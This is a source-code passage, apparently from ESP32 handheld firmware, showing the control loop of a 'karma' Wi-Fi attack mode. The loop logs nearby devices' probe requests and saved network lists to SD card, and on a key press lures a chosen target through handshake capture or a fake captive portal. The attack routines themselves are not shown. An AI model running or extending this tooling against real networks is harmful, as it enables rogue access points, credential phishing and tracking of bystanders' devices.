        if (k == 'c' || k == 'C') {
            s_recCount = s_netCount = s_macCount = s_devCount = 0;
            s_totalProbes = 0; netPage = netSel = devPage = devSel = 0; redraw = true;
        }
        if (k == 's' || k == 'S') {                 // save harvest + devices → NNN.csv
            int seq = karmaSaveTables();
            if (seq >= 0) snprintf(s_saveNotice, sizeof(s_saveNotice), "Saved %03d.csv", seq);
            else          snprintf(s_saveNotice, sizeof(s_saveNotice), "Save failed (no SD)");
            s_saveNoticeMs = millis();
            lastHop = millis();                     // skip a hop after the promiscuous pause
            redraw = true;
        }

        // ── [h] handshake / [p] portal → bait the selected target, then resume ──
        if (k == 'h' || k == 'H' || k == 'p' || k == 'P') {
            char target[33]; target[0] = '\0';
            if (view == VIEW_NETS && s_netCount > 0) {
                int order[KM_NET_MAX]; buildOrder(order, s_netCount);
                int si = netSel < s_netCount ? netSel : s_netCount - 1;
                strncpy(target, s_nets[order[si]].ssid, 32); target[32] = '\0';
            } else if (view == VIEW_DEVS && s_devCount > 0) {
                int order[KM_DEV_MAX]; buildDevOrder(order, s_devCount);
                int si = devSel < s_devCount ? devSel : s_devCount - 1;
                const KmDevice& d = s_devs[order[si]];
                if (d.pnlCount > 0 && d.pnl[0] < (uint16_t)s_netCount)
                    { strncpy(target, s_nets[d.pnl[0]].ssid, 32); target[32] = '\0'; }
            }
            if (target[0]) {
                bool wantHs = (k == 'h' || k == 'H');
                harvestStop();
                if (wantHs) karmaHandshake(target, BAIT_CH, true);
                else        karmaPortal(target, true);
                harvestStart();
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                lastHop = now = millis();
                redraw = true;
            }
        }

        TrackballEvent tb = inputHandler.getTrackballEvent();

        if (view == VIEW_NETS) {
            int n = s_netCount;
            if (tb == TBALL_DOWN && netSel < n - 1) { netSel++; netPage = netSel / KM_RPP; redraw = true; }
            if (tb == TBALL_UP   && netSel > 0)     { netSel--; netPage = netSel / KM_RPP; redraw = true; }
            int totalPages = n ? (n + KM_RPP - 1) / KM_RPP : 1;
            if ((k == 'l' || k == 'L') && netPage < totalPages - 1) { netPage++; netSel = netPage * KM_RPP; redraw = true; }
            if ((k == 'a' || k == 'A') && netPage > 0)              { netPage--; netSel = netPage * KM_RPP; redraw = true; }
        } else {
            int n = s_devCount;
            int totalPages = n ? (n + KM_DEV_RPP - 1) / KM_DEV_RPP : 1;
            if (tb == TBALL_DOWN && devSel < n - 1) { devSel++; devPage = devSel / KM_DEV_RPP; redraw = true; }
            if (tb == TBALL_UP   && devSel > 0)     { devSel--; devPage = devSel / KM_DEV_RPP; redraw = true; }
            if ((k == 'l' || k == 'L') && devPage < totalPages - 1) { devPage++; devSel = devPage * KM_DEV_RPP; redraw = true; }
            if ((k == 'a' || k == 'A') && devPage > 0)              { devPage--; devSel = devPage * KM_DEV_RPP; redraw = true; }
        }

        if (!k && tb == TBALL_NONE) vTaskDelay(pdMS_TO_TICKS(10));
    }

    harvestStop();
    WiFi.mode(WIFI_STA);

    freeBuffers();
    displayManager.printCommandScreen();
}
